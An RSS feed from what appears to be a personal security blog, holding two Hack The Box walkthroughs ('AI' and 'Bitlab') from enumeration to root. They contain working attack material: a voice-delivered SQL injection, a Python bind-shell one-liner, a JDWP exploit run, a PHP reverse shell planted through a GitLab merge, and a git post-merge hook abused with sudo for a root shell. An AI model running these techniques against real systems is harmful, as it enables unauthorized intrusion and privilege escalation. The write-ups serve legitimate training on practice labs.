<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Ceso Adventures</title>
        <link>https://ceso.github.io/posts/</link>
        <description>Recent content in Posts on Ceso Adventures</description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Fri, 07 Feb 2020 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://ceso.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Hack The Box - AI</title>
            <link>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</link>
            <pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</guid>
            <description>Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
This was a box where for the foothold, you needed to upload a .</description>
            <content type="html"><![CDATA[


    <img src="/images/htb/ai/info-card.png"  class="center"  style="border-radius: 8px;"  />



<h2 id="quick-summary">Quick Summary</h2>

<p>Finally, I&rsquo;m posting the walk-through of this box, currently, I&rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.</p>

<p>This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html" target="_blank">JWDP</a>, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different <a href="https://en.wikipedia.org/wiki/Speech_synthesis" target="_blank">TTS</a> I didn&rsquo;t like it, in summary, was a box I didn&rsquo;t feel like learning something new at all.</p>

<p>Said that, time to get our hands dirty.</p>

<h2 id="nmap">Nmap</h2>

<p>As always the enumeration starts by running Nmap:</p>

<pre><code class="language-console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
Nmap scan report for ai.htb (10.10.10.163)
Host is up (0.019s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/11%OT=22%CT=1%CU=38328%PV=Y%DS=2%DC=I%G=Y%TM=5DF152
OS:AE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=108%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 11 15:33:50 2019 -- 1 IP address (1 host up) scanned in 20.74 seconds
</code></pre>

<p>Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.</p>

<h2 id="web-enumeration">Web enumeration</h2>

<p>The home page just shows &ldquo;Artificial Intelligence&rdquo; and has some interactive menus, in one of them, is announced about an AI the company is developing, which can identify what&rsquo;s being told in it, so is possible to upload a file to server, this is already a way to go as is possible to upload a reverse shell.
Some enumeration of it is carried.</p>


    <img src="/images/htb/ai/1.1-web.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/ai/1.1-web-php-1.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/ai/1.1-web-php-2.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/ai/1.1-web-php-3.png"  class="center"  style="border-radius: 8px;"  />



<p>Is given a try to create a .wav file from text (text -&gt; .mp3 -&gt; .wav), upload it and see what happens, the result is an exception which gives a hint: there is access to a mysql database, which means will be possible to do an sql injection.</p>


    <img src="/images/htb/ai/1.1-web-rce-1.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/ai/1.1-web-rce-2.png"  class="center"  style="border-radius: 8px;"  />



<h2 id="foothold">Foothold</h2>

<p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.163
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/07 15:23:07 Starting gobuster
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/contact.php (Status: 200)
/about.php (Status: 200)
/uploads (Status: 301)
/db.php (Status: 200)
/intelligence.php (Status: 200)
/ai.php (Status: 200)
===============================================================
2020/02/07 15:48:32 Finished
===============================================================
</code></pre>

<p>As is possible to see above, <code>intelligence.php</code> was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:</p>


    <img src="/images/htb/ai/2.1-rce-2.png"  class="center"  style="border-radius: 8px;"  />



<p>After a LOT of try-error (literally, I was never able to go beyond this if it wasn&rsquo;t for the help of <a href="https://www.hackthebox.eu/profile/10423" target="_blank">Interep</a> of both queries and different TTS (being I&rsquo;m not a native english speaker and neither I have a microphone), was used in the end <a href="https://www.text2speech.org/" target="_blank">Text 2 Speech</a>:</p>


    <img src="/images/htb/ai/t2s.png"  class="center"  style="border-radius: 8px;"  />



<p>getting as final SQL Injection the next:</p>

<pre><code>User:
Open single quote union select, username from users Comment Database
Password:
Open single quote union select, password from users Comment Database
</code></pre>

<p>Once it&rsquo;s respective .wav files generate by the TTS mentioned above were uploaded, the following were the results:</p>


    <img src="/images/htb/ai/command-ok-1.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/ai/command-ok-2.png"  class="center"  style="border-radius: 8px;"  />



<p>Then, was tried to login via ssh with the credentials:</p>

<pre><code>user: alexa
passwd: H,Sq9t6}a&lt;)?q93_
</code></pre>

<p>Getting a success:</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
alexa@10.10.10.163's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb  7 20:27:47 UTC 2020

  System load:  0.14               Processes:           162
  Usage of /:   28.0% of 19.56GB   Users logged in:     1
  Memory usage: 27%                IP address for eth0: 10.10.10.163
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

63 packages can be updated.
15 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
alexa@AI:~$ wc -c user.txt
33 user.txt
</code></pre>

<h2 id="privilege-escalation">Privilege escalation</h2>

<p>When is checked which net. services are listening, was found :8080:</p>

<pre><code class="language-console">alexa@AI:~$ ss -punta
Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
:Port                 
udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                  0.0.0.0:5353                                             0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                  0.0.0.0:53210                                            0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                     [::]:5353                                                [::]
:*                    
udp                 UNCONN                   0                     0                                                     [::]:55175                                               [::]
:*                    
tcp                 LISTEN                   0                     1                                                127.0.0.1:8000                                             0.0.0.0:*                    
tcp                 LISTEN                   0                     80                                               127.0.0.1:3306                                             0.0.0.0:*                    
tcp                 LISTEN                   0                     128                                          127.0.0.53%lo:53                                               0.0.0.0:*                    
tcp                 LISTEN                   0                     128                                                0.0.0.0:22                                               0.0.0.0:*                    
tcp                 ESTAB                    0                     0                                             10.10.10.163:22                                           10.10.14.29:58570                
tcp                 ESTAB                    0                     36                                            10.10.10.163:22                                           10.10.14.29:54700                
tcp                 LISTEN                   0                     1                                       [::ffff:127.0.0.1]:8005                                                   *:*                    
tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8009                                                   *:*                    
tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8080                                                   *:*                    
tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*                    
tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*                    
tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
</code></pre>

<p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p>


    <img src="/images/htb/ai/tomcat-tunnel.png"  class="center"  style="border-radius: 8px;"  />



<p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html" target="_blank">JDWP</a> enabled:</p>

<pre><code class="language-console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
</code></pre>

<p>A quick search google gives a result the next <a href="https://www.exploit-db.com/exploits/46501" target="_blank">exploit</a></p>

<p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>

<pre><code class="language-python">python -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])&quot;
</code></pre>

<p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>

<pre><code class="language-console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
[+] Found Runtime class: id=650
[+] Found Runtime.getRuntime(): id=7f9080006b60
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0x6ed
[+] Selected payload '/tmp/bind.sh'
[+] Command string object created id:6ee
[+] Runtime.getRuntime() returned context id:0x6ef
[+] found Runtime.exec(): id=7f9080006b98
[+] Runtime.exec() successful, retId=6f0
[!] Command successfully executed
</code></pre>

<p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
ai.lnx.htb [10.10.10.163] 2222 (?) open
bash: cannot set terminal process group (6086): Inappropriate ioctl for device
bash: no job control in this shell
root@AI:~# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
</code></pre>

<p>Done, we have root access and the root.txt flag :D.</p>

<p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Bitlab</title>
            <link>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</link>
            <pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</guid>
            <description>Quick Summary First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the sudo + git path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</description>
            <content type="html"><![CDATA[


    <img src="/images/htb/bitlab/info-card.png"  class="center"  style="border-radius: 8px;"  />



<h2 id="quick-summary">Quick Summary</h2>

<p>First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the <code>sudo + git</code> path as I&rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</p>

<p>This was a cool box, not hard at the technical level, but one that required to enumerate a lot, so pretty cool to get better at that!</p>

<p>Said that, let&rsquo;s get our hands dirty :D</p>

<h2 id="nmap">Nmap</h2>

<p>We start running nmap to get which ports/services are being exposed:</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
</code></pre>

<p>And we get SSH (22) and HTTP (80) are open + that the web service which is running on port 80 is <a href="https://gitlab.com/" target="_blank">Gitlab</a>.</p>

<h2 id="web-enumeration">Web enumeration</h2>

<p>The home page (<code>http://10.10.10.114/</code>), is just the standard login page which bitlab has:</p>


    <img src="/images/htb/bitlab/1.1-web_enum.png"  class="center"  style="border-radius: 8px;"  />



<p>We try the links in this page and check if they are working, with it we found <code>Help</code> it is, and we are redirected to a directory listing having a <code>bookmarks.html</code> and open it:</p>


    <img src="/images/htb/bitlab/1.2-web_enum.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/bitlab/1.3-web_enum.png"  class="center"  style="border-radius: 8px;"  />



<p>We notice that <code>Gitlab Login</code> is an obfuscated js code, we jump into deobfuscate it (I used <a href="https://lelinhtinh.github.io/de4js/" target="_blank">de4js</a> but any deobfuscation tool or even a python console will do it):</p>

<p>From the code:</p>

<pre><code class="language-js">javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
</code></pre>

<p>We get the following code:</p>

<pre><code class="language-js">javascript: (function () {
    var _0x4b18 = [&quot;value&quot;, &quot;user_login&quot;, &quot;getElementById&quot;, &quot;clave&quot;, &quot;user_password&quot;, &quot;11des0081x&quot;];
    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
})()
</code></pre>

<p>With that we get credentials we could try into the login, an user called <code>clave</code> and a password <code>11des0081x</code>, after we try to login with those credentials we are loged and have access to some projects:</p>


    <img src="/images/htb/bitlab/1.5-web_enum.png"  class="center"  style="border-radius: 8px;"  />



<p>Taking a deepest look into <code>Profile</code> we find that this project has <a href="https://docs.gitlab.com/ee/topics/autodevops/" target="_blank">Auto DevOps</a> enabled.
We continue enumerating a bit more, and see that the project called <code>Deployer</code> is in charge to manage to do that: deploy the applications, in the description is given a link pointing to the we take a look into the documentation of <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html" target="_blank">webhooks</a> gitlab has, after it we take a look into <code>index.php</code> to see what it does:</p>


    <img src="/images/htb/bitlab/1.6-web_enum.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/bitlab/1.7-web_enum.png"  class="center"  style="border-radius: 8px;"  />



<pre><code class="language-php">&lt;?php

$input = file_get_contents(&quot;php://input&quot;);
$payload  = json_decode($input);

$repo = $payload-&gt;project-&gt;name ?? '';
$event = $payload-&gt;event_type ?? '';
$state = $payload-&gt;object_attributes-&gt;state ?? '';
$branch = $payload-&gt;object_attributes-&gt;target_branch ?? '';

if ($repo=='Profile' &amp;&amp; $branch=='master' &amp;&amp; $event=='merge_request' &amp;&amp; $state=='merged') {
    echo shell_exec('cd ../profile/; sudo git pull'),&quot;\n&quot;;
}

echo &quot;OK\n&quot;;
</code></pre>

<p>Tying together the pieces we have at this point, we can figure out the foothold: we need to upload a php reverse shell, having it merged to master (the code of <code>index.php</code> specifies git pull will being executed basically if there was a merge to master), once that is done, a webhook will execute <code>index.php</code> from <code>Deployer</code> with this we will have our reverse shell uploaded to server.</p>

<h2 id="rce-www-data-root">RCE -&gt; www-data -&gt; root</h2>

<p>We upload the next <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">php reverse shell by pentestmonkey</a> changing <code>$ip = '127.0.0.1'</code> and <code>$port = 1234</code> to our ip and the port we will be listening in our machine, afterwards we merge it (we will be automatically redirected to the page for merging it).</p>

<p>Now, the reverse shell is uploaded, but we still need to execute it, for that is needed to know which one is the path to execute it, if we remember the project <code>Deployer</code> has it&rsquo;s index.php which will print an &ldquo;OK&rdquo; we could try to access the path of deployer and see if it is printed, if it is, then we know that the path for our reverse shell will be <code>http://10.0.0.14/profile/&lt;name of our reverse shell&gt;</code>:</p>


    <img src="/images/htb/bitlab/1.rce.png"  class="center"  style="border-radius: 8px;"  />



<p>Now we know that indeed that the mentioned url above will be the one wee need to use.
We run the listener for our reverse shell and execute it, with it having our rce:</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
www-data@bitlab:/var/www$ pwd
pwd
/var/www
</code></pre>

<p>We check if we have sudo rights, where is the home of www-data and what we found there:</p>

<pre><code class="language-console">www-data@bitlab:/var/www$ sudo -l
sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
www-data@bitlab:/var/www$ getent passwd www-data
getent passwd www-data
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
www-data@bitlab:/tmp/profile$ cd /var/www/html/profile
cd /var/www/html/profile
www-data@bitlab:/var/www/html/profile$ ls -la
ls -la
total 144
drwxr-xr-x 3 root root  4096 Jan 10 19:56 .
drwxr-xr-x 5 root root  4096 Jul 30 12:37 ..
drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
-rw-r--r-- 1 root root    42 Feb 26  2019 .htaccess
-rw-r--r-- 1 root root   110 Jan  4  2019 README.md
-rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
-rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
</code></pre>

<p>So far we know that the repos of git are under <code>/var/www/html/</code> and that we are allowed to do a git pull with sudo rights inside the repos, this is what we will be using to get root by taking advantage of the webhooks enabled in gitlab (post-merge hook) and the ability to run git pull with root rights (<code>git pull</code> is like git fetch and git merge in one for saying it in a way), for understanding how these 2 things work, jump into the documentation of <a href="https://git-scm.com/docs/githooks#_post_merge" target="_blank">hooks: post merge</a> and the one for <a href="https://git-scm.com/docs/git-pull" target="_blank">git pull</a>.</p>

<p>Our repo doesn&rsquo;t allow us to edit files there, so we copy the repo to a place where we have them:</p>

<pre><code class="language-console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
cp -r profile /tmp/profile
www-data@bitlab:/tmp/profile$ ls -la
ls -la
total 148
drwxr-xr-x 4 www-data www-data  4096 Jan 10 20:08 .
drwxrwxrwt 3 root     root      4096 Jan 10 20:03 ..
drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
-rw-r--r-- 1 www-data www-data    42 Jan 10 20:03 .htaccess
-rw-r--r-- 1 www-data www-data   110 Jan 10 20:03 README.md
-rw-r--r-- 1 www-data www-data 93029 Jan 10 20:03 developer.jpg
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
-rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
</code></pre>

<p>We create a script named as <code>post-merge</code> inside <code>.git/hooks</code> to get a shell as root and give to it execution rights:</p>

<pre><code class="language-console">www-data@bitlab:/tmp/profile$ cd .git/hooks
cd .git/hooks
www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
&lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
chmod u+x post-merge
</code></pre>

<p>Once that is done, we upload any file (doesn&rsquo;t matter) to gitlab and merge it, once that is done from inside this location we have rights, we run <code>sudo git pull</code> and with that we will be root:</p>

<pre><code class="language-console">www-data@bitlab:/tmp/profile$ sudo git pull
sudo git pull
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (3/3), done.
Unpacking objects: 100% (3/3), done.
remote: Total 3 (delta 2), reused 0 (delta 0)
From ssh://localhost:3022/root/profile
   35da5b2..cbbc729  master     -&gt; origin/master
 * [new branch]      patch-2    -&gt; origin/patch-8
Updating 35da5b2..cbbc729
Fast-forward
 1asf | 1 +
 1 file changed, 1 insertion(+)
 create mode 100644 1asf
root@bitlab:/tmp/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bitlab:/tmp/profile# cd /root    
cd /root
root@bitlab:~# ls   
ls 
root.txt
root@bitlab:~# wc -c root.txt
wc -c root.txt
33 root.txt
</code></pre>

<p>With this we can already go to <code>/home</code> and see from there which user and it&rsquo;s respective flag.</p>

<h2 id="beyond-root">Beyond root</h2>

<p>Ok, as I said at the begining of the post, there are 2 paths to get this box:</p>

<p>1 - Intended way (user -&gt; root) by doing reversing.
2 - Taking advantage of this misconfigurations.</p>

<p>I will go now into the 1, but I will only cover how to get user, and in the future once I know some reversing, I will post the last piece.</p>

<h2 id="user">User</h2>

<p>In the home page of the Profile project, there is a hint, is mentioned a connection postgresql and snippets, we go to the snippets page, and we found we have one</p>


    <img src="/images/htb/bitlab/1-intended_user.png"  class="center"  style="border-radius: 8px;"  />



<p>We open it and se it&rsquo;s a script to connect to the database and get a dump of profiles:</p>

<pre><code class="language-js">&lt;?php
$db_connection = pg_connect(&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;);
$result = pg_query($db_connection, &quot;SELECT * FROM profiles&quot;);
</code></pre>

<p>Then, inside the profile project we add a new file with that code, but also we create an array with <code>pg_fetch_all($result)</code> in order to save all the profiles dumped, so the result is this one:</p>

<pre><code class="language-js">&lt;?php
$db_connection = pg_connect(&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;);
$result = pg_query($db_connection, &quot;SELECT * FROM profiles&quot;);
$arr = pg_fetch_all($result);
print_r($arr);
</code></pre>

<p>After save and merge of it, we go to <code>http://10.10.10.114/profile/&lt;name you give to the script&gt;</code>, and we should get as a result printed an array with our previous user <code>clave</code> and a password:</p>

<pre><code class="language-js">Array ( [0] =&gt; Array ( [id] =&gt; 1 [username] =&gt; clave [password] =&gt; c3NoLXN0cjBuZy1wQHNz== ) )
</code></pre>

<p>Before trying to crack the password, we try to use as it is, and indeed it was just that one it was not encrypted!</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
clave@10.10.10.114's password: 
Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
clave@bitlab:~$ id
uid=1000(clave) gid=1000(clave) groups=1000(clave)
clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
clave@bitlab:~$ wc -c user.txt 
33 user.txt
</code></pre>

